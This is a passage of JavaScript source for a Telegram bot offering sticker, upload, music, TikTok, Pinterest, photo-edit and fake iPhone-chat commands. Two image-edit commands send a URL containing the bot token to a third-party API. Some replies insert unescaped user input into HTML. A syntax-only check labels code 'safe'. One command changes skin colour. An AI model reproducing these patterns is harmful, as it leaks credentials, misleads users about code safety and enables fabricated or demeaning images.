    let filterType = "all";
    if (command === "listsenderpublic") filterType = "public";
    if (command === "listsenderprivat") filterType = "private";

    const filteredSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (filterType === "all") return true;
      return data.type === filterType;
    });

    if (filteredSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>sender list</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>filter</td><td>${filterType}</td></tr>
<tr><td>status</td><td>no senders connected</td></tr>
</table>`
      );
    }

    let rowsHtml = "";
    let index = 1;
    for (const [botNumber, data] of filteredSessions) {
      const sock = data.sock;
      const type = data.type ? data.type : "public";
      const status = sock?.user ? "connected" : "not connected";
      const owner = data.ownerId ? `${data.ownerId}` : "unknown";
      rowsHtml += `<tr><td>${index}</td><td>${botNumber}</td><td>${type}</td><td>${status}</td><td>${owner}</td></tr>\n`;
      index++;
    }

    await sendRichMenu(chatId,
      `<h3>sender list (${filterType})</h3>
<table border="2">
<tr><th>#</th><th>bot</th><th>type</th><th>status</th><th>owner</th></tr>
${rowsHtml}
</table>

<p>total: ${filteredSessions.length} senders</p>`
    );
  } catch (error) {
    console.error("error in listbot:", error);
    await sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${error.message}</td></tr>
</table>`
    );
  }
});

bot.onText(/^\/brat(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match?.[1];

    if (!text) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/brat</td></tr>
<tr><td>example</td><td>/brat hello man</td></tr>
</table>`,
            msg.message_id
        );
    }

    const loading = await bot.sendMessage(chatId, `<blockquote>creating brat sticker...</blockquote>`, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
    });

    try {
        const url = `https://api-mininxd.vercel.app/brat?txt=${encodeURIComponent(text)}`;
        const res = await axios.get(url, { responseType: "arraybuffer" });
        const buffer = Buffer.from(res.data);

        await bot.sendSticker(chatId, buffer, {
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
                ]
            }
        });

        await bot.deleteMessage(chatId, loading.message_id);
    } catch (err) {
        console.error("brat error:", err.response?.status, err.message);
        try { await bot.deleteMessage(chatId, loading.message_id); } catch {}
        sendRichMenu(chatId,
            `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to create brat sticker</td></tr>
</table>`,
            msg.message_id
        );
    }
});

bot.onText(/^\/tourl$/, async (msg) => {
    const chatId = msg.chat.id;
    const reply = msg.reply_to_message;

    if (!reply || (!reply.photo && !reply.video && !reply.document)) {
        return sendRichMenu(chatId,
            `<h3>missing media</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to a photo, video or file</td></tr>
<tr><td>then send</td><td>/tourl</td></tr>
</table>`,
            msg.message_id
        );
    }

    try {
        const processingMsg = await bot.sendMessage(chatId, `<blockquote>uploading file...</blockquote>`, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });

        const fileId = reply.photo
            ? reply.photo[reply.photo.length - 1].file_id
            : (reply.video?.file_id || reply.document?.file_id);

        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;
        const responseFile = await axios.get(fileUrl, { responseType: "arraybuffer" });
        const buffer = Buffer.from(responseFile.data);
        const fileName = file.file_path.split("/").pop() || "file";

        const form = new FormData();
        form.append("files[]", buffer, fileName);

        const { data } = await axios.post("https://uguu.se/upload.php", form, { headers: form.getHeaders() });
        const finalUrl = data?.files?.[0]?.url;

        if (!finalUrl) throw new Error("failed to get url");

        await bot.deleteMessage(chatId, processingMsg.message_id).catch(() => {});
        await sendRichMenu(chatId,
            `<h3>upload successful</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>url</td><td>${finalUrl}</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="${finalUrl}" style="primary">open url</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
            msg.message_id
        );
    } catch (err) {
        console.error("tourl error:", err);
        sendRichMenu(chatId,
            `<h3>failed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>error</td><td>${err.response?.data?.error || err.message}</td></tr>
</table>`,
            msg.message_id
        );
    }
});

bot.onText(/^\/play(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1] ? match[1].trim() : "";

    if (!query) {
        return sendRichMenu(chatId,
            `<h3>missing query</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/play rewrite the stars</td></tr>
</table>`,
            msg.message_id
        );
    }

    const waitMsg = await bot.sendMessage(chatId, `<blockquote>searching for song...</blockquote>`, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
    });

    try {
        await bot.sendChatAction(chatId, "upload_document");

        const apiUrl = `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`;
        const { data } = await axios.get(apiUrl, { timeout: 30000 });

        if (!data || !data.status || !data.result) {
            return bot.editMessageText(`<blockquote>song not found.</blockquote>`, {
                chat_id: chatId,
                message_id: waitMsg.message_id,
                parse_mode: "HTML"
            });
        }

        const res = data.result;
        const artistName = "heysaka official id";
        const durationMin = Math.floor((res.duration || 0) / 60);
        const durationSec = ((res.duration || 0) % 60).toString().padStart(2, "0");
        const durationFormatted = `${durationMin}:${durationSec}`;

        await bot.editMessageText(`<blockquote>downloading audio...</blockquote>`, {
            chat_id: chatId,
            message_id: waitMsg.message_id,
            parse_mode: "HTML"
        }).catch(() => {});

        const audioUrl = res.audio ? res.audio.url : res.url;
        const audioStream = await axios.get(audioUrl, {
            responseType: "arraybuffer",
            timeout: 60000,
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
        });

        const audioBuffer = Buffer.from(audioStream.data);
        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

        const captionHtml = `<tg-collage>
  <img src="${res.thumbnail}" />
</tg-collage>

<h3>${res.title}</h3>
<p>artist: ${artistName} | duration: ${durationFormatted}</p>

<tg-song>
  <audio controls preload="none" src="${audioUrl}"></audio>
  <footer style="font-size:12px; color:#888; margin-top:6px;">
    © 2026 - Kintana Bot Telegram
  </footer>
</tg-song>

<tg-button-row>
  <tg-button type="url" url="${res.source || res.url}" style="primary">view video</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;

        await sendRichMenu(chatId, captionHtml, msg.message_id);

    } catch (error) {
        console.error("error /play command:", error.message);
        await bot.editMessageText(`<blockquote>failed to process request.</blockquote>`, {
            chat_id: chatId,
            message_id: waitMsg.message_id,
            parse_mode: "HTML"
        }).catch(() => {});
    }
});

bot.onText(/^\/jadihitam$/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;

        if (!reply || !reply.photo) {
            return sendRichMenu(chatId,
                `<h3>missing photo</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to a photo</td></tr>
</table>`,
                msg.message_id
            );
        }

        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const loading = await bot.sendMessage(chatId, `<blockquote>processing image...</blockquote>`, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });

        const { data } = await axios.get("https://api.ikyyxd.my.id/edit/nanobananav3", {
            params: { prompt: "change the skin to black", url: fileUrl }
        });

        if (!data.status) {
            return bot.editMessageText(`<blockquote>failed to process image.</blockquote>`, {
                chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML"
            });
        }

        await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

        bot.sendPhoto(chatId, data.result.result_url, {
            caption: `<blockquote>successfully changed photo to black skin.</blockquote>`,
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
                ]
            }
        });
    } catch (err) {
        console.error(err);
        sendRichMenu(msg.chat.id,
            `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${err.message}</td></tr>
</table>`,
            msg.message_id
        );
    }
});

bot.onText(/^\/jadianime$/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;

        if (!reply || !reply.photo) {
            return sendRichMenu(chatId,
                `<h3>missing photo</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to a photo</td></tr>
</table>`,
                msg.message_id
            );
        }

        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const loading = await bot.sendMessage(chatId, `<blockquote>processing image...</blockquote>`, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });

        const { data } = await axios.get("https://api.ikyyxd.my.id/edit/nanobananav3", {
            params: { prompt: "change this photo to anime", url: fileUrl }
        });

        if (!data.status) {
            return bot.editMessageText(`<blockquote>failed to process image.</blockquote>`, {
                chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML"
            });
        }

        await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

        bot.sendPhoto(chatId, data.result.result_url, {
            caption: `<blockquote>successfully changed photo to anime.</blockquote>`,
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
                ]
            }
        });
    } catch (err) {
        console.error(err);
        sendRichMenu(msg.chat.id,
            `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${err.message}</td></tr>
</table>`,
            msg.message_id
        );
    }
});

function toSmallCaps(text) {
    return text;
}

function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

bot.onText(/^\/cekfunc$/, async (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "user";
    const token = bot.token;

    if (!msg.reply_to_message) {
        return sendRichMenu(chatId,
            `<h3>usage</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to code message or .js file</td></tr>
<tr><td>then send</td><td>/cekfunc</td></tr>
</table>`,
            msg.message_id
        );
    }

    let codeToCheck = "";
    let funcName = "";
    const replyMsg = msg.reply_to_message;

    try {
        const prosesMsg = await bot.sendSticker(chatId, "CAACAgIAAxkBAAEruXhqSMtyQ-jLc3Kym-SkdNz4SxG92gACtCMAAphLKUjeub7NKlvk2TwE");

        if (replyMsg.document) {
            const doc = replyMsg.document;
            funcName = doc.file_name || "file.js";
            if (!funcName.endsWith('.js')) {
                await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
                return sendRichMenu(chatId,
                    `<h3>invalid file</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>file must be .js</td></tr>
</table>`,
                    msg.message_id
                );
            }
            const fileStream = bot.getFileStream(doc.file_id);
            const chunks = [];
            for await (const chunk of fileStream) chunks.push(chunk);
            codeToCheck = Buffer.concat(chunks).toString("utf-8");
        } else if (replyMsg.text) {
            codeToCheck = replyMsg.text;
            funcName = "reply text";
        } else {
            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            return sendRichMenu(chatId,
                `<h3>unsupported</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>must be code text or .js file</td></tr>
</table>`,
                msg.message_id
            );
        }

        const vm = require('vm');
        try {
            new vm.Script(codeToCheck, { filename: 'checked_file.js' });

            const successHtml = `<h3>function is safe</h3>

<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td><code>/cekfunc</code></td></tr>
<tr><td>source</td><td><code>${escapeHtml(funcName)}</code></td></tr>
<tr><td>status</td><td>function is safe</td></tr>
<tr><td>created</td><td>${escapeHtml(username)}</td></tr>
</table>

<ul>
  <li><input type="checkbox" checked> syntax function valid</li>
  <li><input type="checkbox" checked> no errors detected</li>
</ul>

<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
`;

            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
                chat_id: chatId,
                reply_parameters: { message_id: msg.message_id },
                rich_message: { html: RICH_CSS + successHtml }
            });

        } catch (syntaxError) {
            const stack = syntaxError.stack || "";
            const lines = stack.split('\n');
            let lineNum = 1, colNum = 1;
            const matchLine = lines[0] ? lines[0].match(/checked_file\.js:(\d+)/) : null;
            if (matchLine) lineNum = parseInt(matchLine[1]);
            if (lines[2]) {
                const caretIdx = lines[2].indexOf('^');
                if (caretIdx !== -1) colNum = caretIdx + 1;
            }
            const codeLines = codeToCheck.split('\n');
            const startLine = Math.max(1, lineNum - 3);
            const endLine = Math.min(codeLines.length, lineNum + 3);
            let snippetRows = "";
            for (let i = startLine; i <= endLine; i++) {
                const isTarget = i === lineNum;
                const linePrefix = isTarget ? `<b>${i}</b>` : `${i}`;
                const lineContent = codeLines[i - 1] || "";
                snippetRows += `<tr><td>${linePrefix}</td><td><code>${escapeHtml(lineContent)}</code></td></tr>\n`;
            }

            const errorHtml = `<h3>error detected</h3>

<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td><code>/cekfunc</code></td></tr>
<tr><td>source</td><td>${escapeHtml(funcName)}</td></tr>
<tr><td>line</td><td><b>${lineNum}</b></td></tr>
<tr><td>column</td><td><b>${colNum}</b></td></tr>
<tr><td>error</td><td><code>${escapeHtml(syntaxError.message)}</code></td></tr>
</table>

<h3>code snippet</h3>
<table border="2">
<tr><th>line</th><th>code</th></tr>
${snippetRows}
</table>

<ul>
  <li><input type="checkbox"> syntax function valid</li>
  <li><input type="checkbox"> no errors detected</li>
</ul>

<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
`;

            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
                chat_id: chatId,
                reply_parameters: { message_id: msg.message_id },
                rich_message: { html: RICH_CSS + errorHtml }
            });
        }

    } catch (globalError) {
        sendRichMenu(chatId,
            `<h3>fatal error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>message</td><td>${globalError.message}</td></tr>
</table>`
        );
    }
});

function formatQuote(text) {
    return `<blockquote>${text}</blockquote>`;
}

bot.onText(/^(?:\/tiktok(?:\s+\S+)?|https?:\/\/(?:vm\.tiktok\.com|vt\.tiktok\.com|www\.tiktok\.com)\/[^\s]+)$/, async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const matchUrl = text.match(/(https?:\/\/(?:vm\.tiktok\.com|vt\.tiktok\.com|www\.tiktok\.com)\/[^\s]+)/);

  if (text.startsWith('/tiktok') && !matchUrl) {
    return sendRichMenu(chatId,
      `<h3>tiktok downloader</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>/tiktok &lt;url&gt;</td></tr>
<tr><td>example</td><td>/tiktok https://vt.tiktok.com/abcde123/</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (!matchUrl) return;

  const url = matchUrl[1];
  const loadingMsg = await bot.sendMessage(chatId, formatQuote("tiktok link detected, please wait..."), {
    parse_mode: "HTML", reply_to_message_id: msg.message_id
  });

  const providers = [
    { name: "v3 (tikwm)", run: () => downloadV3(url, chatId) },
    { name: "v6 (hd quality)", run: () => downloadV6(url, chatId) },
    { name: "v5 (multi complete)", run: () => downloadV5(url, chatId) },
    { name: "v1 (support slide)", run: () => downloadV1(url, chatId) },
    { name: "v2 (support slide)", run: () => downloadV2(url, chatId) },
    { name: "v4 (backup)", run: () => downloadV4(url, chatId) }
  ];

  let success = false;

  for (const provider of providers) {
    try {
      success = await provider.run();
      if (success) {
        await bot.editMessageText(formatQuote(`success via server ${provider.name}!`), {
          chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML"
        });
        setTimeout(() => { bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {}); }, 3000);
        break;
      }
    } catch (err) {}
  }

  if (!success) {
    await bot.editMessageText(formatQuote("failed to download tiktok video."), {
      chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML"
    });
  }
});

async function downloadV3(url, chatId) {
  const { data } = await axios.get(`https://www.tikwm.com/api/`, { params: { url } });
  if (data.code !== 0) return false;
  const res = data.data;
  const rawCaption = `tiktok downloader (v3)\n\nauthor : ${res.author.nickname}\ntitle : ${res.title || "no title"}\nlikes : ${res.digg_count}\ncomments : ${res.comment_count}\nshare : ${res.share_count}`;
  await bot.sendVideo(chatId, res.play, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  if (res.music) {
    await bot.sendAudio(chatId, res.music, { title: res.music_info?.title || "tiktok audio", performer: res.music_info?.author || "tiktok" });
  }
  return true;
}

async function downloadV6(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv4`, { params: { url } });
  if (!data.status) return false;
  const res = data.result;
  const rawCaption = `tiktok downloader v6 (hd)\n\nauthor : ${res.author.nickname} (@${res.author.username})\nduration : ${res.duration}s\nsize : ${res.quality.size}\nhd : ${res.quality.is_hd ? "yes" : "no"}`;
  if (res.media?.nowm) await bot.sendVideo(chatId, res.media.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  else if (res.media?.wm) await bot.sendVideo(chatId, res.media.wm, { caption: formatQuote(rawCaption + "\n(watermark)"), parse_mode: "HTML" });
  return true;
}

async function downloadV5(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv3`, { params: { url } });
  if (!data.status) return false;
  const res = data.result;
  const rawCaption = `tiktok downloader v5\n\nauthor : ${res.creator.nickname}\ncaption : ${res.caption || "-"}\nviews : ${res.stats.views}\nlikes : ${res.stats.likes}`;
  if (res.download?.nowm) await bot.sendVideo(chatId, res.download.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  else if (res.download?.wm) await bot.sendVideo(chatId, res.download.wm, { caption: formatQuote(rawCaption + "\n(watermark)"), parse_mode: "HTML" });
  if (res.download?.audio) await bot.sendAudio(chatId, res.download.audio, { title: "tiktok audio", performer: res.creator.nickname });
  return true;
}

async function downloadV1(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktok`, { params: { apikey: "kyzz", query: url } });
  if (!data.status) return false;
  const res = data.result;
  const media = [];
  if (res.video) media.push({ type: "video", media: res.video, caption: formatQuote("tiktok video (v1)") });
  if (res.slides?.length) {
    res.slides.forEach((sl, idx) => {
      media.push({ type: "photo", media: sl.img_result, caption: idx === 0 && !res.video ? formatQuote("tiktok slide (v1)") : undefined });
    });
  }
  for (let i = 0; i < media.length; i += 10) {
    const batch = media.slice(i, i + 10);
    if (batch.length === 1) {
      if (batch[0].type === "video") await bot.sendVideo(chatId, batch[0].media, { caption: batch[0].caption, parse_mode: "HTML" });
      else await bot.sendPhoto(chatId, batch[0].media, { caption: batch[0].caption, parse_mode: "HTML" });
    } else {
      await bot.sendMediaGroup(chatId, batch.map(m => ({ type: m.type, media: m.media, caption: m.caption, parse_mode: "HTML" })));
    }
  }
  if (res.audio) await bot.sendAudio(chatId, res.audio, { caption: formatQuote("tiktok audio"), parse_mode: "HTML" });
  return true;
}

async function downloadV2(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv2`, { params: { url } });
  if (!data.status) return false;
  const res = data.result;
  const media = [];
  res.video?.forEach(v => media.push({ type: "video", media: v }));
  res.audio?.forEach(a => media.push({ type: "audio", media: a }));
  const rawCaption = res.title ? `${res.title}` : undefined;
  const videos = media.filter(m => m.type === "video");
  if (videos.length > 0) {
    for (let i = 0; i < videos.length; i += 10) {
      const slice = videos.slice(i, i + 10);
      await bot.sendMediaGroup(chatId, slice.map((m, idx) => ({
        type: "video", media: m.media,
        caption: i === 0 && idx === 0 && rawCaption ? formatQuote(rawCaption) : undefined,
        parse_mode: "HTML"
      })));
    }
  }
  const audios = media.filter(m => m.type === "audio");
  for (const a of audios) await bot.sendAudio(chatId, a.media);
  return true;
}

async function downloadV4(url, chatId) {
  const { data } = await axios.get(`https://tikdown.ikyzxz.my.id/api/v1`, { params: { url } });
  if (!data.status) return false;
  const res = data;
  const rawCaption = `tiktok downloader v4\n\ntitle : ${res.title || "no title"}\nauthor : ${res.author || "unknown"}`;
  if (!res.download?.nowm) return false;
  await bot.sendVideo(chatId, res.download.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  if (res.download?.mp3) await bot.sendAudio(chatId, res.download.mp3, { title: res.title || "tiktok audio", performer: res.author || "tiktok" });
  return true;
}

const pinMemory = {};

function blockQuote(text) {
  return `<blockquote>${text}</blockquote>`;
}

bot.onText(/^\/pinterest(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();
  const replyOpt = { reply_to_message_id: msg.message_id, parse_mode: 'HTML' };

  if (!query) {
    return sendRichMenu(chatId,
      `<h3>missing query</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/pinterest anime girl</td></tr>
</table>`,
      msg.message_id
    );
  }

  const loading = await bot.sendMessage(chatId, blockQuote('searching for images...'), { ...replyOpt });

  try {
    const { data } = await axios.get('https://api.siputzx.my.id/api/s/pinterest', { params: { query, type: 'image' } });

    if (!data?.data || data.data.length === 0) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return sendRichMenu(chatId,
        `<h3>not found</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no results for "${query}"</td></tr>
</table>`,
        msg.message_id
      );
    }

    const key = Math.random().toString(36).substring(2, 9);
    pinMemory[key] = {
      results: data.data.filter(v => v.image_url),
      index: 0,
      chatId,
      replyTo: msg.message_id
    };

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await sendPin(bot, chatId, key);

  } catch (err) {
    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to retrieve data</td></tr>
</table>`,
      msg.message_id
    );
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  if (!data.startsWith('pin_next_')) return;

  const key = data.replace('pin_next_', '');
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  if (!pinMemory[key]) {
    return bot.answerCallbackQuery(callbackQuery.id, { text: 'session expired, please search again!', show_alert: true });
  }

  await bot.answerCallbackQuery(callbackQuery.id, { text: 'fetching the next 10 images...' });
  await bot.deleteMessage(chatId, messageId).catch(() => {});
  await sendPin(bot, chatId, key);
});

async function sendPin(bot, chatId, key) {
  const data = pinMemory[key];
  if (!data) {
    return sendRichMenu(chatId,
      `<h3>expired</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>data expired or not found</td></tr>
</table>`
    );
  }

  const replyOpt = { reply_to_message_id: data.replyTo, parse_mode: 'HTML' };
  const start = data.index;
  const end = start + 10;
  const slice = data.results.slice(start, end);

  if (!slice.length) {
    return sendRichMenu(chatId,
      `<h3>done</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>all images have been displayed</td></tr>
</table>`,
      data.replyTo
    );
  }

  const page = Math.floor(start / 10) + 1;
  const caption = `pinterest result - page ${page}`;

  const media = slice.map((v, i) => ({
    type: 'photo',
    media: v.image_url,
    caption: i === 0 ? caption : undefined
  }));

  try {
    await bot.sendMediaGroup(chatId, media);
    data.index += 10;

    if (data.index >= data.results.length) {
      return sendRichMenu(chatId,
        `<h3>done</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>all images have been displayed</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
        data.replyTo
      );
    }

    return sendRichMenu(chatId,
      `<h3>pinterest</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>page</td><td>${page}</td></tr>
<tr><td>status</td><td>show next 10 images?</td></tr>
</table>

<tg-button-row>
  <tg-button type="callback_data" data="pin_next_${key}" style="primary">next 10</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      data.replyTo
    );

  } catch (error) {
    console.error('error sendMediaGroup:', error);
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to send images</td></tr>
</table>`,
      data.replyTo
    );
  }
}

bot.onText(/^\/iqc(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1] ? match[1].trim() : "";

  if (!input) {
    return sendRichMenu(chatId,
      `<h3>iqc usage</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>format</td><td>/iqc &lt;text&gt;</td></tr>
<tr><td>example</td><td>/iqc hello, good night!</td></tr>
<tr><td>custom time</td><td>/iqc hello | 22:15 | 22:15</td></tr>
</table>`,
      msg.message_id
    );
  }

  const now = new Date();
  const timeOptions = { timeZone: "Asia/Jakarta", hour: "2-digit", minute: "2-digit", hour12: false };
  const currentTime = now.toLocaleTimeString("id-ID", timeOptions).replace(".", ":");

  let textParam = input;
  let chatTimeParam = currentTime;
  let statusBarTimeParam = currentTime;

  if (input.includes("|")) {
    const parts = input.split("|").map(p => p.trim());
    textParam = parts[0] || "hello";
    chatTimeParam = parts[1] || currentTime;
    statusBarTimeParam = parts[2] || parts[1] || currentTime;
  }

  const waitMsg = await bot.sendMessage(chatId, `<blockquote>creating iphone quote...</blockquote>`, {
    parse_mode: "HTML", reply_to_message_id: msg.message_id
  });

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const apiUrl = `https://api.ikyyxd.my.id/canvas/iqc?text=${encodeURIComponent(textParam)}&chatTime=${encodeURIComponent(chatTimeParam)}&statusBarTime=${encodeURIComponent(statusBarTimeParam)}`;
    const { data } = await axios.get(apiUrl, { timeout: 25000 });

    let imageUrl = null;
    if (typeof data === 'string' && data.startsWith('http')) imageUrl = data;
    else if (data) imageUrl = data.result || data.url || data.data || (data.status && data.result?.url ? data.result.url : null);

    if (!imageUrl && data && data.status === false) {
      return bot.editMessageText(`<blockquote>failed to create iqc image.</blockquote>`, {
        chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML"
      });
    }

    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
    const targetUrl = imageUrl || apiUrl;

    await bot.sendPhoto(chatId, targetUrl, {
      caption: `<blockquote>iphone chat generator\n"${textParam}"</blockquote>`,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
        ]
      }
    });

  } catch (error) {
    console.error("error /iqc command:", error.message);
    try {
      const directApiUrl = `https://api.ikyyxd.my.id/canvas/iqc?text=${encodeURIComponent(textParam)}&chatTime=${encodeURIComponent(chatTimeParam)}&statusBarTime=${encodeURIComponent(statusBarTimeParam)}`;
      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
      await bot.sendPhoto(chatId, directApiUrl, {
        caption: `<blockquote>iphone chat generator\n"${textParam}"</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      });
    } catch (fallbackError) {
      await bot.editMessageText(`<blockquote>api server is currently down.</blockquote>`, {
        chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML"
      }).catch(() => {});
    }
  }
});
